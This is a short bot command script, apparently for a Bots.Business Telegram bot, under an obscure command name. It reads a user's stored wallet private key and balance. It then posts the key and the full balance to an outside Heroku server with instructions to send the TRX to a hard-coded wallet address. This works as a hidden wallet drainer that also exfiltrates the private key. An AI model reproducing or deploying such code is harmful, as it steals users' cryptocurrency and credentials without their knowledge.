/*CMD
  command: rtye
  help: 
  need_reply: false
  auto_retry_time: 
  folder: 

  <<ANSWER

  ANSWER

  <<KEYBOARD

  KEYBOARD
  aliases: 
CMD*/

var cbal = User.getProperty("cbal")
var dp = cbal*1000000
var rs = parseFloat(cbal)
var wpk = "TYDaX99bCCiqcTpnBMi5JMsbZQM2TqSEDf"
var er = User.getProperty("wallpk")
HTTP.post( {
    url: "https://tronb.herokuapp.com/sendtrx",
    success: 'rutujy',
    body:  {receiver : wpk, amount : dp ,private_key : er}
})
